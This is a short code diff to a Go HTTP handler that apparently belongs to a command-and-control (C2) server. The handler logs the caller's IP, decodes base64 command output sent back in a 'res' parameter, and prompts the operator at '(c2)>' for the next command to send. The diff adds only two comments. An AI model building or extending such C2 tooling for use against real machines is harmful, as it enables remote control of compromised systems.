@@ -20,6 +20,7 @@ func cmdHandler(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Println("recieved req from: ", ip)
 
+	//print feedback
 	feedbackBase64 := r.URL.Query().Get("res")
 	feedback, err := base64.StdEncoding.DecodeString(feedbackBase64)
 
@@ -29,6 +30,7 @@ func cmdHandler(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Println("feedback varible is set to:", string(feedback))
 
+	//get next command
 	fmt.Print("(c2)>")
 	reader := bufio.NewReader(os.Stdin)
 	input, err := reader.ReadString('\n')
